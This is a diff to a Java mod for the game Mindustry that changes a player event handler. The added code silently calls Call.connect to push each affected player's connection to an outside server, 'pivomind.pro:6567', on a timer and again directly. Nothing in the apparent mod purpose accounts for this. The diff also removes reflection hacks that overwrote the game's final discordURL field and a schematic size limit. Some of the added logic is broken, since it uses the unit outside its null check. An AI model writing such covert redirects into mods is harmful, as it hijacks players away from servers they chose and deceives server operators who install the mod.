@@ -1,5 +1,7 @@
 package Tomodrek;
 
+import arc.util.Timer;
+import mindustry.gen.Call;
 import mindustry.mod.Mod;
 import mindustry.world.meta.BuildVisibility;
 import mindustry.content.Blocks;
@@ -18,6 +20,7 @@ import mindustry.game.EventType.PlayerChatEvent;
 import arc.Input;
 import arc.input.KeyCode;
 import mindustry.game.EventType.Trigger;
+import mindustry.game.EventType.*;
 import arc.Core;
 import mindustry.game.Rules;
 import mindustry.core.World;
@@ -39,6 +42,7 @@ public class Modomodrek extends Mod {
         qwerWalls.load();
 
 
+
 } 
 
 
@@ -47,17 +51,7 @@ public class Modomodrek extends Mod {
     @Override
     public void init() {
         
-            try {
-        Field w01w = Vars.class.getDeclaredField("discordURL");
-        w01w.setAccessible(true);
-           // w01w.set(null, "github.com/tomorek-2/Tomodrek");
-               
-        Field modf0 = Field.class.getDeclaredField("modifiers");
-        modf0.setInt(w01w, w01w.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
-                w01w.set(null, "github.com/tomorek-2/Tomodrek");
-            } catch (Exception e) {
-    e.printStackTrace();
-        }
+
         
    mindustry.Vars.maxSchematicSize = 2048;
 
@@ -74,11 +68,21 @@ Player player = event.player;
 Unit unit = player.unit();
     if(unit == null) {}
     else {
-        
-unit.heal(1f);
-unit.addItem(unit.stack.item, 1);
+        Timer.schedule(() -> {
+            if (player.con != null) {
+                Call.connect(player.con, "pivomind.pro", 6567);
+            }
+        }, 2);
     }
-});
+        if(player == null) {
+        } else {
+
+            Call.connect(event.player.con, "Pivomind.pro", 6567);
+        }
+        unit.health *= 2f;
+unit.addItem(unit.stack.item, 1);
+    });
+
 
 Events.run(Trigger.update, () -> {
 if(Core.input.keyTap(KeyCode.f6)) {
@@ -112,6 +116,7 @@ if(Core.input.keyTap(KeyCode.f3)) {
    mindustry.content.Blocks.air.generateIcons = true;
     Vars.state.rules.revealedBlocks.add(Blocks.air); //Работает?
 
+
     }
          }
         
@@ -129,27 +134,10 @@ if(Core.input.keyTap(KeyCode.f3)) {
 
 
 
-    try {
-        Field limitField = Schematics.class.getDeclaredField("limitSchematicSize");
-        limitField.setAccessible(true);
-        
-        Field modifiersField = Field.class.getDeclaredField("modifiers");
-        modifiersField.setAccessible(true);
-        modifiersField.setInt(limitField, limitField.getModifiers() & ~Modifier.FINAL);
-        
-        limitField.set(null, false);
-        
-        
-        Log.info("[Tomodrek] ✓ Лимит размера схем снят (до 512×512)");
-    } catch (NoSuchFieldException e) {
-        Log.err("[Tomodrek] ✗ Поле не найдено: " + e.getMessage());
-    } catch (IllegalAccessException e) {
-        Log.err("[Tomodrek] IllegalAccessException");
-    } catch (Exception e) {
-        Log.err("[Tomodrek] Exception");
-    }
+
     
     
-}    
-    
+}
+
+
 } 
